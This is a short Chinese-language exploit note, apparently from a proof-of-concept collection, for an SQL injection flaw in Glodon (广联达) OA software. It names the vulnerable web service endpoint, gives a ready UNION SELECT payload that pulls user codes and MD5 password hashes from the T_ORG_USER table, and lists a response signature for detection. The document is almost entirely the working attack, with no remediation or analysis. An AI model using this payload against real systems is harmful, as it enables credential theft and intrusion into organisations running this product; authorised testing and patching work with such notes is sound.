# 广联达OAsql注入漏洞

广联达OA ｜ SQL注入 ｜ —
- **请求**：`POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1`

**Payload**
```
dasdas=&key=1' UNION ALL SELECT top 1812 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --
```
- **响应特征**：-1